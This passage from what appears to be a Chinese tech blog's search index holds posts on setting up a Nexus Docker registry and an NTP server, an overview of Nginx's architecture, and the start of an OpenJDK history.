改名后迁移到&#x2F;opt</li>\n<li>工作目录<code>./sonatype-work/nexus</code>，注意包含子目录，根据需要迁移或直接挂载数据盘</li>\n</ul>\n<blockquote>\n<p>也可以采用docker部署，镜像位于<code>sonatype/nexus3:3.29.2</code>，run可以设置port、volume</p>\n</blockquote>\n</li>\n<li><p>创建nexus用户，并设置文件权限</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 新建nexus用户及用户组，nexus3不允许root启动</span></span><br><span class=\"line\">groupadd nexus</span><br><span class=\"line\">useradd -d /home/nexus -g nexus nexus</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将代码目录和数据目录赋权给nexus</span></span><br><span class=\"line\"><span class=\"built_in\">chown</span> -R nexus:nexus /opt/nexus</span><br><span class=\"line\"><span class=\"built_in\">chown</span> -R nexus:nexus /opt/sonatype-work</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置NEXUS环境变量，编辑文件<code>/etc/profile.d/nexus.sh</code></p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">NEXUS_HOME=/opt/nexus/</span><br><span class=\"line\">PATH=$NEXUS_HOME/bin:$PATH</span><br><span class=\"line\">export PATH NEXUS_HOME</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>直接<code>cat</code>时，由于$语义替换会出错</p>\n</blockquote>\n</li>\n<li><p>为Nexus设置运行用户名，编辑<code>/opt/nexus/bin/nexus.rc</code><br>并设置<code>run_as_user=&quot;nexus&quot;</code></p>\n</li>\n<li><p>设置系统自启动服务，创建&#96;&#96;，并填写</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /usr/lib/systemd/system/nexus.service &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[Unit]</span></span><br><span class=\"line\"><span class=\"string\">Description=Nexus daemon</span></span><br><span class=\"line\"><span class=\"string\">After=network.target</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[Service]</span></span><br><span class=\"line\"><span class=\"string\">Type=forking</span></span><br><span class=\"line\"><span class=\"string\">LimitNOFILE=65536</span></span><br><span class=\"line\"><span class=\"string\">ExecStart=/opt/nexus/bin/nexus start</span></span><br><span class=\"line\"><span class=\"string\">ExecStop=/opt/nexus/bin/nexus stop</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">User=nexus</span></span><br><span class=\"line\"><span class=\"string\">Restart=on-abort</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[Install]</span></span><br><span class=\"line\"><span class=\"string\">WantedBy=multi-user.target</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n\n<p> 然后就是常规操作</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> --now nexus</span><br><span class=\"line\">systemctl status nexus</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"NEXUS仓库设置\"><a href=\"#NEXUS仓库设置\" class=\"headerlink\" title=\"NEXUS仓库设置\"></a>NEXUS仓库设置</h2><p>通过浏览器访问<a href=\"http://192.168.0.147:8081/\">http://192.168.0.147:8081</a></p>\n<p>初次访问登录时，需要设置admin的密码，初始密码在<code>/opt/sonatype-work/nexus3/admin.xxxx</code>文件中，一般设为<code>admin123</code>。</p>\n<p>然后，就可以根据需要设置各类私服仓库了。</p>\n<ol>\n<li>设置docker-proxy</li>\n<li>设置docker-group</li>\n<li>设置Realms权限</li>\n</ol>\n<h2 id=\"Client使用方法\"><a href=\"#Client使用方法\" class=\"headerlink\" title=\"Client使用方法\"></a>Client使用方法</h2><ol>\n<li>设置insecure-registries</li>\n<li>设置registry-mirrors</li>\n<li>重启docker服务</li>\n</ol>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@<span class=\"built_in\">test</span> ~]<span class=\"comment\"># more /etc/docker/daemon.json</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;insecure-registries&quot;</span>:[</span><br><span class=\"line\">        <span class=\"string\">&quot;192.168.0.147:9001&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;192.168.0.149&quot;</span></span><br><span class=\"line\">    ],</span><br><span class=\"line\">    <span class=\"string\">&quot;registry-mirrors&quot;</span>: [</span><br><span class=\"line\">        <span class=\"string\">&quot;http://192.168.0.147:9001&quot;</span></span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>待续…</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://godleon.github.io/blog/Nexus_Repository/docker-configure-proxy-with-nexus/\">安裝 Nexus Repository Manager 作為 Docker Hub Mirror &amp; Docker Image Proxy</a></li>\n<li><a href=\"https://www.0x0f0f.com/docker/create-docker-repository-in-nexus/create-docker-repository-in-nexus/\">Nexus上配置Docker仓库</a></li>\n<li><a href=\"https://jenkins-zh.cn/wechat/articles/2020/05/2020-05-13-using-nexus-oss-as-a-proxy-cache-for-docker-images/\">使用 Nexus OSS 为 Docker 镜像提供代理&#x2F;缓存功能</a></li>\n<li><a href=\"https://wiki.jikexueyuan.com/project/linux-in-eye-of-java/Nexus-Install-And-Settings.html\">Nexus 安装和配置</a></li>\n<li><a href=\"https://www.xncoding.com/2017/09/02/tool/nexus.html\">maven私服nexus3.x环境配置</a></li>\n<li><a href=\"https://qizhanming.com/blog/2017/05/16/how-to-install-sonatype-nexus-oss-33-on-centos-7\">CentOS 7 下安装和配置 Sonatype Nexus 3.3</a></li>\n<li><a href=\"https://www.cnblogs.com/blaketairan/p/7136735.html\">maven私服 nexus2.x工作目录解读</a></li>\n<li><a href=\"https://juejin.cn/post/6844903781654593550\">使用harbor和nexus作为docker registry</a></li>\n<li><a href=\"https://blog.csdn.net/wq6ylg08/article/details/91351339\">Java版本号解读</a></li>\n</ul>\n"},{"title":"NTP时间同步服务器的安装记录","url":"/2020/08/22/NTP%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<p>网络时间协议（英语：Network Time Protocol，缩写：NTP）是在数据网络潜伏时间可变的计算机系统之间通过分组交换进行时钟同步的一个网络协议，位于 OSI 模型的应用层。自 1985 年以来，NTP 是当前仍在使用的最古老的互联网协议之一。NTP 由特拉华大学的 David L. Mills 设计。<br>计算机主机一般同多个时钟服务器连接，利用统计学的算法过滤来自不同服务器的时间，以选择最佳的路径和来源以便校正主机时间。即使在主机长时间无法与某一时钟服务器联系的情况下，NTP 服务依然可以有效运转。</p>\n<h2 id=\"NTP-Server的安装步骤\"><a href=\"#NTP-Server的安装步骤\" class=\"headerlink\" title=\"NTP Server的安装步骤\"></a>NTP Server的安装步骤</h2><ol>\n<li><p>安装NTP软件，并做一次手工时间校准。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install -y ntp</span><br><span class=\"line\">ntpdate cn.pool.ntp.org</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>编辑NTP配置文件，位于<code>/etc/ntp.conf</code></p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost etc]<span class=\"comment\"># cat /etc/ntp.conf</span></span><br><span class=\"line\">driftfile /var/lib/ntp/drift</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 允许内网其他机器同步时间</span></span><br><span class=\"line\">restrict 192.168.0.0 mask 255.255.255.0 nomodify notrap</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 配置上级时间服务器</span></span><br><span class=\"line\">server ntp.ntsc.ac.cn prefer</span><br><span class=\"line\">server ntp1.aliyun.com</span><br><span class=\"line\">server cn.pool.ntp.org</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 外部时间服务器不可用时，以本地时间作为时间服务</span></span><br><span class=\"line\">server 127.127.1.0</span><br><span class=\"line\">fudge 127.127.1.0 stratum 10</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置NTP系统启动服务</p>\n <figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]# systemctl enable ntpd --now</span><br><span class=\"line\">Created symlink from /etc/systemd/system/multi-user.target.wants/ntpd.service to /usr/lib/systemd/system/ntpd.service.</span><br><span class=\"line\"></span><br><span class=\"line\">[root@localhost ~]# systemctl status ntpd</span><br><span class=\"line\">● ntpd.service - Network Time Service</span><br><span class=\"line\">Loaded: loaded (/usr/lib/systemd/system/ntpd.service; enabled; vendor preset: disabled)</span><br><span class=\"line\">Active: active (running) since 日 2021-11-07 13:31:53 CST; 1min 21s ago</span><br><span class=\"line\">Process: 8715 ExecStart=/usr/sbin/ntpd -u ntp:ntp $OPTIONS (code=exited, status=0/SUCCESS)</span><br><span class=\"line\">Main PID: 8716 (ntpd)</span><br><span class=\"line\">CGroup: /system.slice/ntpd.service</span><br><span class=\"line\">        └─8716 /usr/sbin/ntpd -u ntp:ntp -g</span><br><span class=\"line\"></span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: Listen normally on 2 lo 127.0.0.1 UDP 123</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: Listen normally on 3 eth0 192.168.0.54 UDP 123</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: Listen normally on 4 eth0 192.168.0.140 UDP 123</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: Listen normally on 5 lo ::1 UDP 123</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: Listen normally on 6 eth0 fe80::8f4f:d214:efbc:f83d UDP 123</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: Listening on routing socket on fd #23 for interface updates</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: 0.0.0.0 c016 06 restart</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: 0.0.0.0 c012 02 freq_set kernel 0.000 PPM</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: 0.0.0.0 c011 01 freq_not_set</span><br><span class=\"line\">11月 07 13:31:56 localhost.localdomain ntpd[8716]: 0.0.0.0 c514 04 freq_mode</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用<code>ntpq -np</code> 和 <code>ntpstat</code>命令检查NTP运行状态</p>\n <figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]# netstat -tunpl</span><br><span class=\"line\">Active Internet connections (only servers)</span><br><span class=\"line\">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class=\"line\">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1045/master         </span><br><span class=\"line\">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1117/sshd           </span><br><span class=\"line\">tcp6       0      0 ::1:25                  :::*                    LISTEN      1045/master         </span><br><span class=\"line\">tcp6       0      0 :::22                   :::*                    LISTEN      1117/sshd           </span><br><span class=\"line\">udp        0      0 192.168.0.140:123       0.0.0.0:*                           1289/ntpd           </span><br><span class=\"line\">udp        0      0 127.0.0.1:123           0.0.0.0:*                           1289/ntpd           </span><br><span class=\"line\">udp        0      0 0.0.0.0:123             0.0.0.0:*                           1289/ntpd           </span><br><span class=\"line\">udp6       0      0 fe80::6c3c:5cff:fee:123 :::*                                1289/ntpd           </span><br><span class=\"line\">udp6       0      0 ::1:123                 :::*                                1289/ntpd           </span><br><span class=\"line\">udp6       0      0 :::123                  :::*                                1289/ntpd  </span><br><span class=\"line\"></span><br><span class=\"line\">[root@localhost ~]# ntpstat</span><br><span class=\"line\">synchronised to local net (127.127.1.0) at stratum 11</span><br><span class=\"line\">time correct to within 7948 ms</span><br><span class=\"line\">polling server every 64 s</span><br><span class=\"line\"></span><br><span class=\"line\">[root@localhost ~]# ntpq -np</span><br><span class=\"line\">    remote           refid      st t when poll reach   delay   offset  jitter</span><br><span class=\"line\">==============================================================================</span><br><span class=\"line\">*ntp.ntsc.ac.cn  .OLEG.           1 u    5   64  337    7.459   26.113  15.259</span><br><span class=\"line\">+120.25.115.20   10.137.53.7      2 u    1   64  373   41.897   23.154   8.982</span><br><span class=\"line\">+124.108.20.1    216.218.254.202  2 u    4   64  377  194.241   31.783   7.919</span><br><span class=\"line\">LOCAL(0)        .LOCL.          10 l  144   64  374    0.000    0.000   0.000</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>NTP服务器的状态，其中： * 代表当前主用站点，+ 代表优先站点， - 代表备用站点。</p>\n</blockquote>\n</li>\n</ol>\n<hr>\n<h2 id=\"NTP-Client-的设置方法\"><a href=\"#NTP-Client-的设置方法\" class=\"headerlink\" title=\"NTP Client 的设置方法\"></a>NTP Client 的设置方法</h2><ol>\n<li><p>安装NTP软件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install -y ntp</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>编辑NTP配置文件，位于<code>/etc/ntp.conf</code>。 删除默认内容，加入内网NTP服务器地址</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/ntp.conf &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\"># 设置内网NTP服务器地址</span></span><br><span class=\"line\"><span class=\"string\">server 192.168.0.140</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#允许时间服务器(上游时间服务器)修改本机时间</span></span><br><span class=\"line\"><span class=\"string\">restrict 192.168.0.140 nomodify notrap noquery</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置系统启动服务，并检查运行状态</p>\n <figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]# systemctl enable ntpd --now</span><br><span class=\"line\"></span><br><span class=\"line\">[root@localhost ~]# ntpq -p</span><br><span class=\"line\"> remote           refid      st t when poll reach   delay   offset  jitter</span><br><span class=\"line\">==============================================================================</span><br><span class=\"line\">*192.168.0.140   114.118.7.161    2 u    4   64   77    0.320    0.022   0.027</span><br></pre></td></tr></table></figure></li>\n</ol>\n<blockquote>\n<p>由于NTP服务占用系统端口123，可能被FireWalld防火墙封堵，如果无法同步时，注意检查防火墙</p>\n</blockquote>\n<h2 id=\"分析：ntpd-Vs-ntpdate\"><a href=\"#分析：ntpd-Vs-ntpdate\" class=\"headerlink\" title=\"分析：ntpd Vs ntpdate\"></a>分析：ntpd Vs ntpdate</h2><ul>\n<li><code>ntpd</code>    :在实际同步时间时是一点点的校准过来时间的，最终把时间慢慢的校正对（平滑同步）</li>\n<li><code>ntpdate</code> :不会考虑其他程序是否会阵痛，直接调整时间（“跃变”）。</li>\n</ul>\n<p>换句话说，ntpd是校准时间，ntpdate是调整时间。</p>\n<p>注意，系统后台服务只能采用<code>ntpd</code>，这是因为，<code>ntpdate</code>的跃变模式存在较大的系统风险，包括：</p>\n<ol>\n<li><strong>不安全</strong>。ntpdate 的设置依赖于 ntp 服务器的安全性，攻击者可以利用一些软件设计上的缺陷，拿下 ntp 服务器并令与其同步的服务器执行某些消耗性的任务。由于 ntpdate 采用的方式是跳变，跟随它的服务器无法知道是否发生了异常（时间不一样的时候，唯一的办法是以服务器为准）。</li>\n<li><strong>不精确</strong>。一旦 ntp 服务器宕机，跟随它的服务器也就会无法同步时间。与此不同，ntpd 不仅能够校准计算机的时间，而且能够校准计算机的时钟。</li>\n<li><strong>不优雅</strong>。由于是跳变，而不是使时间变快或变慢，依赖时序的程序会出错（例如，如果 ntpdate 发现你的时间快了，则可能会经历两个相同的时刻，对某些应用而言，这是致命的）。</li>\n</ol>\n<p>因而，使用ntpdate一般由系统管理员在刚刚启动，没有业务负荷时手工操作来校准时间。</p>\n<hr>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://cloud.tencent.com/document/product/213/30393\">配置 NTP 服务 - 腾讯云</a></li>\n<li><a href=\"https://www.jianshu.com/p/8b4befdd9196\">快速部署ntp时间服务器</a></li>\n<li><a href=\"https://blog.51cto.com/wolfgang/1127162\">NTP时间服务器配置详解</a></li>\n<li><a href=\"https://huataihuang.gitbooks.io/cloud-atlas/content/service/ntp/ntpq_timed_out_nothing_received.html\">ntpq: read: Connection refused 疑难问题排查</a></li>\n</ul>\n"},{"title":"Nginx 安装和配置方法","url":"/2022/04/23/Nginx-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/","content":"<p>nginx（发音为“engine x”）是一个免费的开源 Web 服务器，由俄罗斯软件工程师 Igor Sysoev 编写。自 2004 年公开推出以来，nginx 一直专注于高性能、高并发和低内存使用。Web 服务器功能之上的附加功能，如负载平衡、缓存、访问和带宽控制，以及与各种应用程序有效集成的能力，有助于使 nginx 成为现代网站架构的理想选择。目前 nginx 是 Internet 上第二受欢迎的开源 Web 服务器。</p>\n<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>如前所述，nginx 代码库由一个核心和许多模块组成。nginx的核心负责提供web服务器、web和邮件反向代理功能的基础；它支持使用底层网络协议，构建必要的运行时环境，并确保不同模块之间的无缝交互。但是，大多数特定于协议和应用程序的功能是由 nginx 模块完成的，而不是核心。</p>\n<p>在内部，nginx 通过管道或模块链处理连接。换句话说，对于每一个操作，都有一个模块在做相关的工作；例如，压缩、修改内容、执行服务器端包含、通过 FastCGI 或 uwsgi 协议与上游应用程序服务器通信，或与 memcached 通信。</p>\n<p>有几个 nginx 模块位于核心和真正的“功能”模块之间。这些模块是 http和mail。这两个模块在核心组件和低级组件之间提供了额外的抽象级别。在这些模块中，实现了对与相应应用层协议（如 HTTP、SMTP 或 IMAP）相关联的事件序列的处理。结合nginx核心，这些上层模块负责维护对各个功能模块的正确调用顺序。虽然 HTTP 协议目前作为http模块的一部分实现，但由于需要支持 SPDY 等其他协议（请参阅“SPDY：更快网络的实验性协议“）。</p>\n<p>功能模块可以分为事件模块、阶段处理程序、输出过滤器、变量处理程序、协议、上游和负载均衡器。尽管事件模块和协议也用于mail. 事件模块提供特定的操作系统相关的事件通知机制，如kqueue或epoll。nginx 使用的事件模块取决于操作系统的能力和构建配置。协议模块允许 nginx 通过 HTTPS、TLS&#x2F;SSL、SMTP、POP3 和 IMAP 进行通信。</p>\n<p><img src=\"/2022/04/23/Nginx-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/architecture.png\" alt=\"Nginx 技术架构\"></p>\n<h2 id=\"安装方法\"><a href=\"#安装方法\" class=\"headerlink\" title=\"安装方法\"></a>安装方法</h2><h2 id=\"配置文件-etc-nginx-nginx-conf\"><a href=\"#配置文件-etc-nginx-nginx-conf\" class=\"headerlink\" title=\"配置文件 &#x2F;etc&#x2F;nginx&#x2F;nginx.conf\"></a>配置文件 &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</h2><p>nginx 配置保存在许多纯文本文件中，这些文件通常位于<code>/etc/nginx/</code>或 <code>/etc/local/nginx/</code>. 主配置文件通常称为 <code>nginx.conf</code>. 为了保持整洁，部分配置可以放在单独的文件中，这些文件可以自动包含在主文件中。所有与 nginx Web 服务器行为相关的配置都应该驻留在一组集中的配置文件中。</p>\n<p>配置文件最初由主进程读取和验证。nginx 配置的编译只读形式可供worker进程使用，因为它们是从主进程派生的。配置结构由通常的虚拟内存管理机制自动共享。</p>\n<p>nginx 配置有几个不同的上下文用于main, http, server, upstream, location（也 mail用于邮件代理）指令块。上下文永远不会重叠。例如，没有将 location块放在main指令块中这样的事情。此外，为了避免不必要的歧义，没有像“全局 Web 服务器”配置这样的东西。nginx 配置旨在简洁且符合逻辑，允许用户维护包含数千条指令的复杂配置文件。在一次私人谈话中，Sysoev 说，“全局服务器配置中的位置、目录和其他块是我在 Apache 中不喜欢的功能，所以这就是为什么它们从未在 nginx 中实现的原因。”</p>\n<p>配置语法、格式和定义遵循所谓的 C 风格约定。这种制作配置文件的特殊方法已经被各种开源和商业软件应用程序使用。根据设计，C 风格的配置非常适合嵌套描述，具有逻辑性并且易于创建、阅读和维护，并且受到许多工程师的喜爱。nginx 的 C 风格配置也可以很容易地自动化。</p>\n<p>配置文件最初由主进程读取和验证。nginx 配置的编译只读形式可供worker进程使用，因为它们是从主进程派生的。配置结构由通常的虚拟内存管理机制自动共享。</p>\n<p>nginx 配置有几个不同的上下文用于main, http, server, upstream, location（也 mail用于邮件代理）指令块。上下文永远不会重叠。例如，没有将 location块放在main指令块中这样的事情。此外，为了避免不必要的歧义，没有像“全局 Web 服务器”配置这样的东西。nginx 配置旨在简洁且符合逻辑，允许用户维护包含数千条指令的复杂配置文件。在一次私人谈话中，Sysoev 说，“全局服务器配置中的位置、目录和其他块是我在 Apache 中不喜欢的功能，所以这就是为什么它们从未在 nginx 中实现的原因。”</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"http://nginx.org/en/download.html\">Nginx 官方下载</a></li>\n<li><a href=\"http://nginx.org/en/docs/\">Nginx 官方文档</a></li>\n<li><a href=\"https://www.zhukun.net/archives/7343\">安装Nginx + FancyIndex插件</a></li>\n<li><a href=\"https://www.24kplus.com/others/1770.html\">解决 Can’t open PID file &#x2F;var&#x2F;run&#x2F;nginx.pid (yet?) after start: No such file or directory 错误</a></li>\n</ul>\n"},{"title":"OpenJDK的技术概述","url":"/2021/11/21/OpenJDK%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>1995年，Sun公司正式发布了Java语言，并建立了<code>JCP（Java Community Process）</code>开源社区，负责管理Java技术标准。<br><code>JSR（Java Specification Requests）</code>是JCP发布的技术规范，由拥有投票权的JCP成员集体投票决定。</p>\n<p>为了开发和运行Java应用软件，必须为用户提供一个完整的开发套件，这就是<code>JDK</code>（Java Development Kit），包含了编译器、软件库和Java虚拟机等核心组件。1999年之后，Sun公司发布了多个版本的JDK产品，主要包括：</p>\n<ul>\n<li><code>J2SE</code>：Java Platform Standard Edition，标准版的Java平台。目标是工作站等标准应用，也是最常见的</li>\n<li><code>J2EE</code>：Java Platform Enterprise Edition，企业版的Java平台。目标是企业级应用，通常是收费的</li>\n<li><code>J2ME</code>：Java Platform Micro Edition，微型版的Java平台。目标是手机、游戏机等移动设备、嵌入式设备，但由于Android的发展已被淘汰</li>\n<li><code>Java Card</code>：广泛运用在SIM卡、提款卡上，以具有安全防护性的方式来执行小型的Java Applet</li>\n</ul>\n<blockquote>\n<p>2010年，Oracle收购Sun以后，<code>J2SE</code>也被称为<code>Oralce JDK</code>，而JCP董事会也受到广泛批评，被称为“Oracle的橡皮图章”。</p>\n</blockquote>\n<h2 id=\"JDK-JRE-JVM\"><a href=\"#JDK-JRE-JVM\" class=\"headerlink\" title=\"JDK &amp; JRE &amp; JVM\"></a>JDK &amp; JRE &amp; JVM</h2><p>Java的技术理念是“<strong>一次编译，到处运行</strong>”，核心特性就是跨平台，必须通过<code>JRE</code>(Java Runtime Enviroment)解决平台适配问题。<br><code>JRE</code>就是运行Java程序所必须环境的集合，面向Java程序的使用者，而不是开发者。因此，如果你仅下载并安装了JRE，那么你的系统只能运行Java程序，但无法进行开发。</p>\n<p>以Oracle JDK为例，其技术架构参见<a href=\"https://docs.oracle.com/javase/8/docs/index.html\">Java SE Platform at a Glance</a>，而JRE仅仅是<strong>不包含开发工具</strong>。</p>\n<img src=\"/2021/11/21/OpenJDK%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/j2se.png\" class=\"\">\n\n<h3 id=\"1-开发工具（Tools-Tool-APIs）\"><a href=\"#1-开发工具（Tools-Tool-APIs）\" class=\"headerlink\" title=\"1. 开发工具（Tools &amp; Tool APIs）\"></a>1. 开发工具（Tools &amp; Tool APIs）</h3><p>开发工具仅在<code>JDK</code>中提供，具体包括编译器javac、解释器交互工具java、打包工具jar等。<br>由于<code>JRE</code>不包含此部分，因此只能用于部署生产环境，无法支持开发。</p>\n<h3 id=\"2-核心类和支持库文件（Java-SE-API）\"><a href=\"#2-核心类和支持库文件（Java-SE-API）\" class=\"headerlink\" title=\"2. 核心类和支持库文件（Java SE API）\"></a>2. 核心类和支持库文件（Java SE API）</h3><ul>\n<li>Integration Libraries：集成库文件，包括数据库连接JDBC、CORBA接口IDL、名字和目录服务JNDI等</li>\n<li>Other Base Libraries：其他基础库文件，包括XML解析器、网络接口、JSON序列化、日期时间函数等</li>\n<li>Base Libraries：核心库文件。包括基础类定义、数学计算、反射等动态语言特性、日志等监控功能</li>\n</ul>\n<p>此外，由于浏览器技术的快速发展，Java主要被用于后台服务处理，以下组件实际上很少使用，基本被淘汰</p>\n<ul>\n<li>Deployment：用于开发浏览器脚本和插件等，后来出现了替代开源项目IcedTea，但均未成为行业主流</li>\n<li>User Interface Toolkits：GUI工具，但由于浏览器技术的快速发展，java，未成为行业主流</li>\n</ul>\n<h3 id=\"3-虚拟机（Java-Virtuanl-Machine）\"><a href=\"#3-虚拟机（Java-Virtuanl-Machine）\" class=\"headerlink\" title=\"3. 虚拟机（Java Virtuanl Machine）\"></a>3. 虚拟机（Java Virtuanl Machine）</h3><p>Java虚拟机是JRE的核心引擎，它支持不同的平台，如Intel 32位和64位架构，ARM架构和SPARC等。<br>Oracle JDK使用<code>HotSpot</code>作为默认引擎，用于解释并执行字节码。<br>BEA公司开发了<code>JRockit</code>引擎，特点是使用纯编译的执行引擎，没有解释器。随着被Oracle收购，从JDK 8已经被融合到<code>HotSpot</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">bogon:~ sj$ java -version</span><br><span class=\"line\">java version &quot;15.0.2&quot; 2021-01-19</span><br><span class=\"line\">Java(TM) SE Runtime Environment (build 15.0.2+7-27)</span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM (build 15.0.2+7-27, mixed mode, sharing)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"结论：JDK-Java虚拟机-Runtime类库-编译器等开发工具包\"><a href=\"#结论：JDK-Java虚拟机-Runtime类库-编译器等开发工具包\" class=\"headerlink\" title=\"结论：JDK &#x3D; Java虚拟机 + Runtime类库 + 编译器等开发工具包\"></a>结论：JDK &#x3D; Java虚拟机 + Runtime类库 + 编译器等开发工具包</h3><img src=\"/2021/11/21/OpenJDK%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/JDK-2.png\" class=\"\">\n\n<h2 id=\"OpenJDK-Community-OpenJDK的诞生\"><a href=\"#OpenJDK-Community-OpenJDK的诞生\" class=\"headerlink\" title=\"OpenJDK Community - OpenJDK的诞生\"></a>OpenJDK Community - OpenJDK的诞生</h2><p>2005年，Sun公司发布了Java语言和Java SE，虽然通过“Sun社群代码许可”（Sun Community Source License），源代码可以免费使用。但是，使用了Java源代码的程序必须遵守Java的编程规范，商业性改编程序必须要得到Sun的许可。</p>\n<p>2006年，为了缓解IT行业的巨大压力，Sun公司牵头组建了开源社区<code>OpenJDK Community</code>，初始源代码采用GPL v2许可证。</p>\n<p>2007年，Sun公司正式发布了开源版的Java开发组件（OpenJDK），作为Java SE 6的开源和免费实现，并根据<code>GNU GPL</code>许可证授权，向开发人员开放了创作改编程序所必要的权限，并赋予其在不同许可下发布应用程序的能力。</p>\n<p>目前，OpenJDK社区包含了大量Project项目，例如：</p>\n<ul>\n<li>JDK 6-9：基于JSR 270（Java SE 6 Release Contents），构建Jave SE 6的开源实现，7-9版本类似</li>\n<li>OpenJDK：这是最重要的项目，负责构建OpenJDK 10-18版本的开源技术实现。由于自JDK 10开始，Oracle JDK与OpenJDK实现了融合，该项目产出的OpenJDK直接成为了Java SE的官方参考实现，因此不再为每个版本单独设立项目，OpenJDK 18是当前最新的开发版本。</li>\n<li>Graal：源于SUN公司的<code>Maxine VM</code>项目，采用高度优化的JIT编译器。2012年从OpenJDK项目中剥离出来，并在JDK 10中纳入实验性功能</li>\n<li>IcedTea：最初是由于OpenJDK不完整（例如个别字体库由于许可证差异而无法提供）而创立的，为社区提供必要的开源工具链及代码库。它有一个基于<code>./configure</code>的不同的构建系统，正是由于IcedTea的努力，许多第三方发行版大大减少了使用补丁的数量</li>\n</ul>\n<p><code>OpenJDK Project</code> 项目组成员包括Oracle、IBM、Alibaba，Amazon、Azul、Google，Huawei，Intel、Microsoft等几乎所有主流IT公司，使用C++和Java编程语言开发。</p>\n<p>没错，从 Java SE 7开始往后的版本，连大名鼎鼎的 Oracle JDK 都是根据 Open JDK 做出来的 